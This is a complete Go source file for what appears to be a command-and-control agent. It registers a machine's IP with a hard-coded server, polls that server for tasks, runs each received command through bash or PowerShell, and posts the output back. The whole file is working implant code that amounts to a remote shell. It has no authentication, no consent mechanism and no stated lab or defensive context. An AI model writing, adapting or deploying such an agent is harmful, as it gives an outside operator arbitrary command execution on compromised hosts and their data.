package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type Task struct {
	Action   string `json:"action"`
	Command  string `json:"command"`
	TaskID   string `json:"task_id"`
}

type Result struct {
	AgentID   string `json:"agent_id"`
	TaskID    string `json:"task_id"`
	Result    string `json:"result"`
	ReturnCode int    `json:"returncode"`
}

type Client struct {
	ServerIP string
	Port     string
	LocalIP  string
}

func getLocalIP() string {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'").Output()
		if err == nil {
			return strings.TrimSpace(string(out))
		}
	} else {
		addrs, err := net.InterfaceAddrs()
		if err == nil {
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
	}
	return "UNKNOWN"
}

func (c *Client) register() error {
	data := map[string]string{"agent_id": c.LocalIP}
	jsonData, _ := json.Marshal(data)
	resp, err := http.Post("http://"+c.ServerIP+":"+c.Port+"/register", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return fmt.Errorf("failed to register, status: %d", resp.StatusCode)
	}
	return nil
}

func (c *Client) handleTask(task Task) {
	var cmdOutput []byte
	var err error
	var returnCode int

	if task.Action == "command" {
		if runtime.GOOS == "windows" {
			cmdOutput, err = exec.Command("powershell", "-Command", task.Command).CombinedOutput()
		} else {
			cmdOutput, err = exec.Command("bash", "-c", task.Command).CombinedOutput()
		}
		if err != nil {
			if exitError, ok := err.(*exec.ExitError); ok {
				returnCode = exitError.ExitCode()
			} else {
				returnCode = 1
			}
		}

		result := Result{
			AgentID:   c.LocalIP,
			TaskID:    task.TaskID,
			Result:    string(cmdOutput),
			ReturnCode: returnCode,
		}
		jsonData, _ := json.Marshal(result)
		http.Post("http://"+c.ServerIP+":"+c.Port+"/results", "application/json", bytes.NewBuffer(jsonData))
	}
}

func (c *Client) run() {
	for {
		err := c.register()
		if err == nil {
			break
		}
		time.Sleep(60 * time.Second)
	}

	for {
		data := map[string]string{"agent_id": c.LocalIP}
		jsonData, _ := json.Marshal(data)

		resp, err := http.Post("http://"+c.ServerIP+":"+c.Port+"/tasks", "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			time.Sleep(120 * time.Second)
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 418 {
			c.register()
			continue
		}

		if resp.StatusCode == 204 {
			time.Sleep(120 * time.Second)
			continue
		}

		if resp.StatusCode != 200 && resp.StatusCode != 201 {
			time.Sleep(120 * time.Second)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		var task Task
		json.Unmarshal(body, &task)
		c.handleTask(task)
	}
}

func main() {
	client := Client{
		ServerIP: "10.50.0.12",
		Port:     "80",
		LocalIP:  getLocalIP(),
	}
	client.run()
}
